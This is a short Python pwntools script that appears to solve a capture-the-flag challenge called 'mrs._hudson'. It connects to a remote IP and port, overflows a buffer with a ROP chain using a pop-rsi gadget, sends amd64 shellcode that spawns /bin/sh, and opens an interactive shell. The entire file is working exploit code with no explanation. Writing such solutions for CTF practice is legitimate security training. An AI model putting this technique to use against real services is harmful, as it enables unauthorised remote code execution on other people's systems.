from pwn import *

#s = process("./mrs._hudson")
s = remote("178.62.249.106", 8642)

s.clean()

poprsi = p64(0x00000000004006f1)
ropchain = poprsi + p64(0x601060) + "R"*8 + p64(0x400676)

buf = "A"*(cyclic(0x200).index(p64(0x6261616762616166))-8)
buf += p64(0x601160)
buf += ropchain
s.sendline(buf)

sc = asm(shellcraft.amd64.linux.sh(), arch="amd64")
buf = sc + "\xcc"*(0x100-len(sc)) + "Q"*8 + p64(0x601060)
s.sendline(buf)
s.interactive()
